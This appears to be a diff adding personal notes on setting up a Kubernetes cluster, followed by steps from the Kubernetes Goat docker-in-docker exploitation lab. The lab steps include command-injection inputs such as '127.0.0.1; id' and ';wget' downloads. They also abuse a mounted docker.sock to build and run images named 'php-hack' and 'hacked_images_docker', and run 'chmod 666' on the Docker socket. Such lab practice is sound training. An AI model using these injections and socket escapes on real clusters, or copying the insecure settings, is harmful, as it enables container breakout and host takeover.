@@ -1,0 +1,81 @@
+sudo hostnamectl set-hostname "k8s-master.ndbien.local"
+sudo hostnamectl set-hostname "k8s-worker.ndbien.local"
+sudo hostnamectl set-hostname "k8s-worker2.ndbien.local"
+
+
+sudo nano /etc/hosts
+
+192.168.1.4  k8s-master.ndbien.local k8s-master
+192.168.1.5  k8s-worker.ndbien.local k8s-worker
+192.168.127.134  k8s-worker2.ndbien.local k8s-worker2
+
+sudo kubeadm init \
+  --pod-network-cidr=192.168.0.0/16 \
+  --control-plane-endpoint=k8s-master.ndbien.local
+
+kubeadm join k8s-master.ndbien.local:6443 --token z1fw1r.y7thhxcisqh8zvzb \
+        --discovery-token-ca-cert-hash sha256:beebe95e807cc174ebb510150981eeb6fc64b9007213844557c1b978e6efd5a9
+
+curl https://raw.githubusercontent.com/projectcalico/calico/v3.25.0/manifests/calico.yaml -O
+
+sudo kubeadm reset
+
+sudo kubeadm init
+
+sudo kubeadm init phase certs apiserver
+
+sudo kubeadm init phase kubeconfig admin
+--insecure-skip-tls-verify=true
+
+kubectl get pods -n kube-system
+
+kubectl get nodes
+
+
+ ;/tmp/crictl -r unix:///custom/containerd/containerd.sock pull biladen/php-hack
+
+https://www.letscloud.io/community/how-to-install-kubernetesk8s-and-docker-on-ubuntu-2004
+
+https://nvtienanh.info/blog/cai-dat-kubernetes-cluster-tren-ubuntu-server-22-04
+
+https://madhuakula.com/kubernetes-goat/docs/scenarios/scenario-2/docker-in-docker-exploitation-in-kubernetes-containers/welcome/
+
+127.0.0.1; id
+
+; mount
+
+;uname -a
+
+;wget https://download.docker.com/linux/static/stable/x86_64/docker-17.03.0-ce.tgz -O /tmp/docker.tgz
+
+;tar -xvzf /tmp/docker.tgz -C /tmp/
+
+;tmp/docker/docker -H unix:///custom/docker/docker.sock images
+
+;tmp/docker/docker -H unix:///custom/docker/docker.sock build -t php-hack /data/
+;tmp/docker/docker -H unix:///custom/docker/docker.sock run -dp 8089:80 php-hack
+
+chmod 666 /var/run/docker.sock
+
+ls -l /custom/docker/docker.sock
+DOCKER_HOST=unix:///custom/docker/docker.sock docker version
+
+kubectl exec -it health-check-deployment-799f864f94-wzq4d -- /bin/bash
+
+id
+
+mount
+
+docker -H unix:///run/docker.sock  images
+
+docker -H unix:///run/docker.sock run -p 8085:80  ph4n10m1808/hacked_images_docker
+
+hostname -I
+
+curl http://10.244.0.45:8085
+
+docker exec -it a221d98fdd21 curl http://localhost:80
+
+kubectl exec -it health-check-deployment-5479685f9b-g4hvj    -- bash
+
+docker -H unix:///run/docker.sock run -p 8085:80 ph4n10m1808/hacked_images_docker
